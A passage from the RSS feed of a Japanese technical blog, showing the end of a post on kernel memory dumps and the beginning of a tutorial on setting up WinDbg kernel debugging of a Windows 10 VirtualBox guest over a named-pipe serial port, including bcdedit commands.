&lt;h2 id=&quot;まとめ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%81%BE%E3%81%A8%E3%82%81&quot; aria-label=&quot;まとめ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;まとめ&lt;/h2&gt;
&lt;p&gt;今回は、Windows環境でカーネルメモリダンプを取得する方法と、WinDbgを用いた簡単な解析方法について紹介しました。&lt;/p&gt;
&lt;p&gt;今後は、より高度な解析手法についてもまとめていく予定です。&lt;/p&gt;
&lt;p&gt;WinDbgを用いたWindowsのデバッグやダンプの解析方法について公開しているその他情報については、以下のページのリストをご覧ください。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;/windows-windbg-001-index&quot;&gt;WinDbgを用いたデバッグとトラブルシューティングのテクニック&lt;/a&gt;s&lt;/p&gt;</content:encoded></item><item><title><![CDATA[WinDbgでWindows10環境のカーネルデバッグを行う最初の一歩]]></title><link>https://kashiwaba-yuki.com/windows-windbg-004-kernel-debug</link><guid isPermaLink="false">https://kashiwaba-yuki.com/windows-windbg-004-kernel-debug</guid><pubDate>Wed, 06 Oct 2021 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;WinDbgによるWindowsデバッグやダンプ解析によるトラブルシューティングに習熟することを目指しています。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;/windows-windbg-002-tutorial&quot;&gt;WinDbgのユーザモードデバッグチュートリアルを試してみた&lt;/a&gt;の記事では、公式チュートリアルの内容を参考にWinDbgでユーザモードプロセスのデバッグを行う最初の一歩について紹介しました。&lt;/p&gt;
&lt;p&gt;今回の記事では、WinDbgを用いてカーネル モードデバッグを実施する方法についてまとめます。&lt;/p&gt;
&lt;p&gt;WinDbgを用いたWindowsのデバッグやダンプの解析方法について公開している情報については、以下のページに一覧をまとめているので、よければご覧ください。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;/windows-windbg-001-index&quot;&gt;WinDbgを用いたデバッグとトラブルシューティングのテクニック&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;この記事では以下の内容についてまとめています。&lt;/p&gt;
&lt;!-- omit in toc --&gt;
&lt;h2 id=&quot;もくじ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%82%E3%81%8F%E3%81%98&quot; aria-label=&quot;もくじ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;もくじ&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#%E3%82%AB%E3%83%BC%E3%83%8D%E3%83%AB%E3%83%A2%E3%83%BC%E3%83%89%E3%83%87%E3%83%90%E3%83%83%E3%82%B0%E3%81%AE%E3%81%9F%E3%82%81%E3%81%AE%E7%92%B0%E5%A2%83%E6%A7%8B%E7%AF%89&quot;&gt;カーネルモードデバッグのための環境構築&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E4%BB%8A%E5%9B%9E%E4%BD%BF%E7%94%A8%E3%81%99%E3%82%8B%E7%92%B0%E5%A2%83&quot;&gt;今回使用する環境&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#virtualbox%E3%81%AE%E8%A8%AD%E5%AE%9A%E5%A4%89%E6%9B%B4&quot;&gt;VirtualBoxの設定変更&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%82%AB%E3%83%BC%E3%83%8D%E3%83%AB%E3%83%A2%E3%83%BC%E3%83%89%E3%83%87%E3%83%90%E3%83%83%E3%82%B0%E3%81%AE%E6%9C%89%E5%8A%B9%E5%8C%96&quot;&gt;カーネルモードデバッグの有効化&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#windbg%E3%81%AE%E8%A8%AD%E5%AE%9A%E3%82%92%E3%81%99%E3%82%8B&quot;&gt;WinDbgの設定をする&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#windbg%E3%81%A7%E3%82%AB%E3%83%BC%E3%83%8D%E3%83%AB%E3%83%87%E3%83%90%E3%83%83%E3%82%B0%E3%82%92%E8%A1%8C%E3%81%86&quot;&gt;WinDbgでカーネルデバッグを行う&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#windbg%E3%81%8B%E3%82%89%E3%82%AB%E3%83%BC%E3%83%8D%E3%83%AB%E3%82%92%E5%81%9C%E6%AD%A2%E3%81%99%E3%82%8B&quot;&gt;WinDbgからカーネルを停止する&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%82%AB%E3%83%BC%E3%83%8D%E3%83%AB%E3%83%A2%E3%83%BC%E3%83%89%E3%83%87%E3%83%90%E3%83%83%E3%82%B0%E3%81%A7%E3%83%A2%E3%82%B8%E3%83%A5%E3%83%BC%E3%83%AB%E4%B8%80%E8%A6%A7%E3%82%92%E8%A1%A8%E7%A4%BA%E3%81%99%E3%82%8B&quot;&gt;カーネルモードデバッグでモジュール一覧を表示する&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%82%AB%E3%83%BC%E3%83%8D%E3%83%AB%E3%83%A2%E3%82%B8%E3%83%A5%E3%83%BC%E3%83%AB%E3%81%AB%E3%83%96%E3%83%AC%E3%83%BC%E3%82%AF%E3%83%9D%E3%82%A4%E3%83%B3%E3%83%88%E3%82%92%E8%A8%AD%E5%AE%9A%E3%81%99%E3%82%8B&quot;&gt;カーネルモジュールにブレークポイントを設定する&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%81%BE%E3%81%A8%E3%82%81&quot;&gt;まとめ&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;カーネルモードデバッグのための環境構築&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%AB%E3%83%BC%E3%83%8D%E3%83%AB%E3%83%A2%E3%83%BC%E3%83%89%E3%83%87%E3%83%90%E3%83%83%E3%82%B0%E3%81%AE%E3%81%9F%E3%82%81%E3%81%AE%E7%92%B0%E5%A2%83%E6%A7%8B%E7%AF%89&quot; aria-label=&quot;カーネルモードデバッグのための環境構築 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;カーネルモードデバッグのための環境構築&lt;/h2&gt;
&lt;p&gt;WinDbgを用いてカーネルモードデバッグを行うためには、WinDbgを使用する「ホストコンピュータ」と、デバッグ対象のターゲットコンピュータの2つを用意し、下記のいずれかの方法で接続する必要があります。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;イーサネット&lt;/li&gt;
&lt;li&gt;USB 2.0 / USB 3.0&lt;/li&gt;
&lt;li&gt;シリアル (null モデムとも呼ばれる)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/ja-jp/windows-hardware/drivers/debugger/getting-started-with-windbg--kernel-mode-&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;WinDbg の概要 (カーネル モード) - Windows drivers | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;※ より正確には、すべてのカーネルプロセスにアクセスしてデバッグを行うためには2台のマシンが必要です。
1台のマシンでローカルカーネルデバッグを実施することもできますが、OSの稼働を止める必要があるような解析は行うことができず、制限が発生します。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/ja-jp/windows-hardware/drivers/debugger/setting-up-local-kernel-debugging-of-a-single-computer-manually&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;単一コンピューターのローカル カーネル デバッグの手動設定 - Windows drivers | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;なお、通常カーネルモードデバッグを行う際には2台のコンピュータが必要ですが、WinDbgは仮想マシンにインストールしたWindowsに対してもカーネルモードデバッグを行うことができます。&lt;/p&gt;
&lt;p&gt;今回は、VirtualBox上に構築したWindowsマシンに対してカーネルモードデバッグを仕掛けていきます。&lt;/p&gt;
&lt;h3 id=&quot;今回使用する環境&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E4%BB%8A%E5%9B%9E%E4%BD%BF%E7%94%A8%E3%81%99%E3%82%8B%E7%92%B0%E5%A2%83&quot; aria-label=&quot;今回使用する環境 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;今回使用する環境&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;ホストマシン&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Windows10 Pro 20H2&lt;/li&gt;
&lt;li&gt;WinDbg 10.0.22000.1 AMD64 (管理者権限で起動)&lt;/li&gt;
&lt;li&gt;VirtualBox 6.1.26&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ターゲットマシン&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Windows 10 Pro 1511 (VirtualBox上に構築)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;virtualboxの設定変更&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#virtualbox%E3%81%AE%E8%A8%AD%E5%AE%9A%E5%A4%89%E6%9B%B4&quot; aria-label=&quot;virtualboxの設定変更 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;VirtualBoxの設定変更&lt;/h3&gt;
&lt;p&gt;今回は、VirtualBox側ですでにWindowsの仮想マシンが構築されていることを前提とします。&lt;/p&gt;
&lt;p&gt;カーネルモードデバッグを行うために、VirtualBoxの仮想マシン側でCOMポートの設定を行います。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;ホストマシンのVirtualBoxマネージャで、デバッグ対象の仮想マシンの設定を開きます。&lt;/li&gt;
&lt;li&gt;次に[シリアルポート]の設定項目を開き、[ポート1]を有効化します。&lt;/li&gt;
&lt;li&gt;ここで、以下の設定をそれぞれ実施します。&lt;/li&gt;
&lt;li&gt;ポート番号：COM1&lt;/li&gt;
&lt;li&gt;ポートモード：ホストにパイプ&lt;/li&gt;
&lt;li&gt;パス/アドレス：&lt;code class=&quot;language-text&quot;&gt;\\.\pipe\com1&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/57d56d521ef808486eb1a1b8a20d0c26/0b533/image-11.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 67.08333333333334%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAARlAAAEZQAGA43XUAAACy0lEQVQ4y51SSU9TURR+LYXwP9SdY+JCE40sXJCIA7pQXGhYoGjqT1ASTdy4UnCjlAroAtQERGVUpLRWOtFJChShAx1e2/c6Pdq+1+Hz3guoG2PiSb57bs4757vfOedxbosZGVFEio8jnUogIyQRj/HEJ5ATk0jySWSFFLmnIKYECCSeThPwMfRrWzB0aS/eXNmPp62H8OjcYXAOlwclpYw/bTUSQFbKQlYqEBKkWBSQyeUglxTEhBAychLVCjBw+wL0Lftwr/kozp84jtaTx8ANfjRhanED3o04QmkF0VwF4c04fL5lhEIhokYkSEMUtn04HEY0EkVgYx3d15rxsGkP7p4+AO2pg7jZdATc9Z7PuKhfx5kXUZwdlnB5KAm3P4jNcAiBQBAiGQdFNptFJpNhnoKSB3xe/HDbEfDYwK99x/jjLnCv3r7HrG0JU2YXpglmzE7MLxFl+QJrn+d5RCIR5EjLW1tbkCQJpVKJoVytQqnWfo1sbLAX3PiHMfi8LrgcVrgX7XATb/NvIpWVUKtUkM9LiMVi8Pv9jJyqKxaLJJ5HsVBAheTIcokRDuoI4cjIKNweD6w2O+wOB2w2GzxknlJRZkmKojBVwWCQzNVHtiwwUhovl8uoEpVlcqc2qn8Obnj4NZxOJxYWFmCxWGG1WDDnWsPy2gaSZMMFooYW05YpkSzLrF2qjBLSb3JpW+E7/TNwExMT7PWVlRXWln91Fd5ADAmy1QKZmSwr+JdVCTm1l306cG1tV6HV3kFn5y10dNxAe3s7Jr+5kSuUGKGy006tVvsrKjuEOl0fOGL0gKa+ESqVht1npmdYwu426Zxo0W9UWWwXu4/29hKFKrUGaoq6etQ3NDJCo8mE/7H+/gFSr1KTo44wa6BSNzDCJ909sFqtmJ39gjmDAYb5eRgMFEbmjUYjW+Ai+TM+zZkxNmnAV5MZD7ru4yfPlHJ8skb53QAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/57d56d521ef808486eb1a1b8a20d0c26/8ac56/image-11.webp 240w,
/static/57d56d521ef808486eb1a1b8a20d0c26/d3be9/image-11.webp 480w,
/static/57d56d521ef808486eb1a1b8a20d0c26/b0a15/image-11.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/57d56d521ef808486eb1a1b8a20d0c26/8ff5a/image-11.png 240w,
/static/57d56d521ef808486eb1a1b8a20d0c26/e85cb/image-11.png 480w,
/static/57d56d521ef808486eb1a1b8a20d0c26/0b533/image-11.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/57d56d521ef808486eb1a1b8a20d0c26/0b533/image-11.png&quot;
            alt=&quot;image-11.png&quot;
            title=&quot;image-11.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;これでVirtualBox側の設定は完了したので、仮想マシンを起動します。&lt;/p&gt;
&lt;h3 id=&quot;カーネルモードデバッグの有効化&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%AB%E3%83%BC%E3%83%8D%E3%83%AB%E3%83%A2%E3%83%BC%E3%83%89%E3%83%87%E3%83%90%E3%83%83%E3%82%B0%E3%81%AE%E6%9C%89%E5%8A%B9%E5%8C%96&quot; aria-label=&quot;カーネルモードデバッグの有効化 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;カーネルモードデバッグの有効化&lt;/h3&gt;
&lt;p&gt;仮想マシンが起動したら、コマンドラインを管理者権限で起動して、以下のコマンドを入力します。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;bcdedit &lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;debug on
bcdedit &lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;dbgsettings serial debugport:1 baudrate:115200&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;もしくは、&lt;code class=&quot;language-text&quot;&gt;Msconfig.exe&lt;/code&gt;を起動して、詳細オプションからCOM1ポートを指定してデバッグを有効化します。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 666px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/7be9c75f374117e7a6f4bb8a457bd035/ace37/image-9.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 83.75%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAARCAYAAADdRIy+AAAACXBIWXMAAAsTAAALEwEAmpwYAAADQ0lEQVQ4y41Tz4tbVRi9dKBQKwi1RYrLakFtUReCq67tyo11VcFFFyIUayuFKpTROgstUysMUloVBRcuWov/hB3QOp02Y5LJZCbJe3k/7n0/8/J+JJPk+H33JTPtrg8O3+U+7vnOOd+94q/lf7DeaKBaX0e700Gr/Tja2Go9HTYZm1sQjXoNgzQGRgXS2EcvkIh9F/3IQ9YLMBmmwHb2VBjkGcTfNRN310b4ozLE3UcFbq/muLOa4feVFH8+SvHb/Qw3lzPcWi5riXSK2b8UN5ZzbLgphGm7yMZAnE+QDKBh+BlqLQeVZhcd1YcVD9ENB7AixhBOb0TYhs37tMd1vRvB9SMI13FQfsSKiYYfRvClA9fuQrkWWUkxyPooCGkSQU73kzjUe8O8jzAMID0fwpkSTiaTshK6rkKlUsHqw4f4d2UF/1WrsCwbURRDKYUODc80u5BSaXieB0d6cBURGoaBZrOJytoaGjRtwzTRMiyaWBONjQ0isuC6LnzfJ8JII45jDV4HQaArE3oBWbZtGz53IKVZliHPc5i2RLvVQovAB5Mk2SGLwpDs7WLWwFUeAnIgpJQoigKKap8O8qeoE6timN2ubsaHHieYKeS9eKrQD4mQM+GPLfV6CcbjMSRNq9ncQK1eR5Xya9MFnylkAWWGJlxal5ZD2JQ7D3OHkDt5RMqVLW9RhtVaTR/knLkyIat+8GBF524YJjr0j8VYdP12pswT5vzKDAu4XkidfT0QVsRN/GmzmVKdIaljhaVlBeWHZYbj0RCDIsf2oNCV82DliobFVyKgw1LbC3fIdokj9ChP03K0C/HuB2dx6sxneI/w/kef4+Tpc1j69Q4iUrg1nbRDNp8kCqcor03aT1Cpb+LUuasQ4pmXIfYRnn0F4sCbEHuO4MPzCxht05NyXK1SqvICK+VpSAblJadrJrx3vwJx5B2IuUPHMXfoGOZeeAN7X3wLYv9RXPjqevlqKIrySe5iMhnD8HowZAAvKciJh34cYK3WwHNHT5DCA6zsVYjnX8Oeg8eJ8CW8ffI0vln6BZe/vYH5xZuEW5i/9hO+/O5nXF78EZ9e+QGfzH+PiwtLuHTlGr5YuI6PL36NvYdfx/+wGK4WmV5fYAAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/7be9c75f374117e7a6f4bb8a457bd035/8ac56/image-9.webp 240w,
/static/7be9c75f374117e7a6f4bb8a457bd035/d3be9/image-9.webp 480w,
/static/7be9c75f374117e7a6f4bb8a457bd035/be082/image-9.webp 666w&quot;
              sizes=&quot;(max-width: 666px) 100vw, 666px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/7be9c75f374117e7a6f4bb8a457bd035/8ff5a/image-9.png 240w,
/static/7be9c75f374117e7a6f4bb8a457bd035/e85cb/image-9.png 480w,
/static/7be9c75f374117e7a6f4bb8a457bd035/ace37/image-9.png 666w&quot;
            sizes=&quot;(max-width: 666px) 100vw, 666px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/7be9c75f374117e7a6f4bb8a457bd035/ace37/image-9.png&quot;
            alt=&quot;image-9.png&quot;
            title=&quot;image-9.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;上記の設定が完了したら、ホストマシン側でWinDbgの設定を行います。&lt;/p&gt;
&lt;h3 id=&quot;windbgの設定をする&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#windbg%E3%81%AE%E8%A8%AD%E5%AE%9A%E3%82%92%E3%81%99%E3%82%8B&quot; aria-label=&quot;windbgの設定をする permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;WinDbgの設定をする&lt;/h3&gt;
&lt;p&gt;ホストマシン側で、WinDbgを管理者権限で起動します。&lt;/p&gt;
&lt;p&gt;カーネルモードデバッグの場合は、WinDbgも管理者権限で起動しておく必要があります。
もしユーザモードで起動している場合は、&lt;code class=&quot;language-text&quot;&gt;Kernel debugger failed initialization, Win32 error 5 アクセス拒否されました&lt;/code&gt;というエラーとともにカーネルモードデバッグに失敗します。&lt;/p&gt;
&lt;p&gt;WinDbgを管理者権限で起動したら、[File]&gt;[Kernel Debug]を選択し、以下の画像のように名前付きパイプを利用してターゲットマシンに接続させます。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/4ee28ac0fb172f16033a6266f6071c7a/0b533/image-13.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 58.75%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAYAAABiDJ37AAAACXBIWXMAARlAAAEZQAGA43XUAAABdElEQVQoz52S6W6CUBCFef83UVGoCiSKaRMTdsGoD9AfdWmtstcKwilzE4220dpO8mVm7oWTWS4XRRG2YQw/SuDHKT7zDPs8R14cUJQFvltZlrhlnGObsG0bhq6foNx1XTiOA02v7gyniscwTReeO4FVxbY3hWVZGI1GmM1mmE6nzHOWaUDTdEwmk9MFQbnneRiPx5BkCbVaDTzPo9lsotHgUeeb7Kxer7OzI1wSx1iv14iiEGEYIkkS7HY77Pd7RlEUrBJBEKAoCiRJOiHL8kVOcPP5C5bLJXzfx2q1wmazQRAESNMUh8OBzUWvxtBqtdgPnU7nJtxiMQcthiphC9pufyzAMIwLwW63exXWclC1SoJUGQlSTGL/EjyvpjyPK0j4X4LHWV2zPwtmWYbX4APPqwBvQYrN+5q1T1unuWqadr8gbXA4HELuP0GQVSjqI/q9HlRVxWAwYJ4+bLfbzP8qKIoie5Ci0MKDKDBPb+6ce8WIL0AtNRYExCc0AAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/4ee28ac0fb172f16033a6266f6071c7a/8ac56/image-13.webp 240w,
/static/4ee28ac0fb172f16033a6266f6071c7a/d3be9/image-13.webp 480w,
/static/4ee28ac0fb172f16033a6266f6071c7a/b0a15/image-13.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/4ee28ac0fb172f16033a6266f6071c7a/8ff5a/image-13.png 240w,
/static/4ee28ac0fb172f16033a6266f6071c7a/e85cb/image-13.png 480w,
/static/4ee28ac0fb172f16033a6266f6071c7a/0b533/image-13.png 500w&quot;
